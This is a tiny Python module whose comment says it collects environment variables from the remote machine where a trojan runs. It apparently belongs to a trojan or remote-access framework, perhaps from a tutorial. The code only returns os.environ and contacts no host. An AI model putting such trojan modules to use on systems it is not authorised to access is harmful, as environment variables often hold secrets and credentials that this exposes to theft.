import os

def run(**args):
    print("[*] In environment module")
    return os.environ

# Rettrreives any environement variable set on the remote machine where the trojan is executing